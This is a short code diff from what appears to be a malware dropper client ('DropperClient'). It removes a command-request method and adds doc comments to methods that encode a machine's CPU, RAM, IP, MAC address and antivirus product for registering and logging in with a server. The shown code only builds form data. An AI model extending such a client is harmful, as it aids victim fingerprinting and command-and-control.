@@ -5,14 +5,15 @@ namespace DropperClient.Dataparser
 {
     internal class FormEncoder
     {
-        public FormUrlEncodedContent CreateGetCommandData(string macaddress)
-        {
-            return CreatEncodedContent(new Dictionary<string, string>()
-            {
-                {"Mac", macaddress }
-            });
-        }
-
+        /// <summary>
+        /// Creates a FormUrlEncodedContent instance with the necessary information to register the client
+        /// </summary>
+        /// <param name="cpu">Client's cpu </param>
+        /// <param name="ram">Client's ram </param>
+        /// <param name="ip">Client's IP</param>
+        /// <param name="macaddres">Client's mac?</param>
+        /// <param name="antivirus">Client's av</param>
+        /// <returns></returns>
         public FormUrlEncodedContent CreateRegisterData(string cpu, string ram, string ip, string macaddres, string antivirus)
         {
             return CreatEncodedContent(new Dictionary<string, string>()
@@ -25,6 +26,11 @@ namespace DropperClient.Dataparser
             });
         }
 
+        /// <summary>
+        /// Creates a FormUrlEncodedContent instance with the necessary information to login the client
+        /// </summary>
+        /// <param name="macaddress">Client's mac</param>
+        /// <returns></returns>
         public FormUrlEncodedContent CreateLoginData(string macaddress)
         {
             return CreatEncodedContent(new Dictionary<string, string>()
